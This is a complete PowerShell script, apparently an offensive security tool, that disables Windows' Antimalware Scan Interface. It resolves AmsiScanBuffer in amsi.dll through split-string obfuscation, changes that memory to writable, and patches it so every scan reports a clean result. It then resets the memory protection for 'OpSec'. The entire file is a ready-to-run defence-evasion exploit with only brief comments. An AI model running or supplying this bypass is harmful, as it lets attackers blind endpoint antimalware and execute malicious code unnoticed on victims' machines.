Write-Host "##  Modified AMSI Bypass Script  ##"
Write-Host "##       Wayne @ VigilantAsia    ##"
Write-Host "##       Credits: RastaMouse     ##"

# Import WINAPI functions
$WinApiFunctions = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("ker" + "nel" + "32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("ker" + "nel" + "32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("ker" + "nel" + "32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $WinApiFunctions

Write-Host -ForeGround Yellow "[*] Getting handle on FunctionThatMustNotBeNamed"

# Get handle on FunctionThatMustNotBeNamed
$asbHandle = [Win32]::GetProcAddress([Win32]::LoadLibrary("am" + "si." + "dll"), "Am"+ "si" + "Sc" + "an" + "Buf" + "fer")

if ($asbHandle -eq 0) {
    Write-Host -ForeGround Red "[!] Failed to get handle. Exiting...."
    Break
}

Write-Host -ForeGround Yellow "[*] Successfully acquired FunctionThatMustNotBeNamed handle"


# Set Virtual Address Space to R/W 0x40
if ([Win32]::VirtualProtect($asbHandle, [uint32]5, 0x40, [ref]0) -eq $true) 
{
    Write-Host -ForeGround Yellow "[*] Successfuly set Virtual Address Space to Read/Write"
}
else {
    Write-Host -ForeGround Red "[!] Failed to set Virtual Address Space"
}


# mov eax, 0x80070057 - AMSI_RESULT_CLEAN
$patch = @(0xB8)
$patch = $patch + (0x57)
$patch = $patch + (0x00)
$patch = $patch + (0x07)
$patch = $patch + (0x80)
$patch = $patch + (0xC3)

# Patch to instruction to always return AMSI_RESULT_CLEAN 
Write-Host -ForeGround Yellow "[*] Patching memory to always return AMSI_RESULT_CLEAN"
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]]$patch, 0, $asbHandle, 6)


# Set memory back to RO for OpSec purposes
Write-Host -ForeGround Yellow "[*] Setting Virtual Address Space back to Read-Only"
[Win32]::VirtualProtect($asbHandle, [uint32]5, 0x20, [ref]4) | Out-Null


$asb = "amsi" + "scan" + "buffer"
Write-Host -ForeGround Green "[+] AMSI Bypass complete."
Write-Host -ForeGround Green "[+] Type ""$asb"" in your console now to verify."

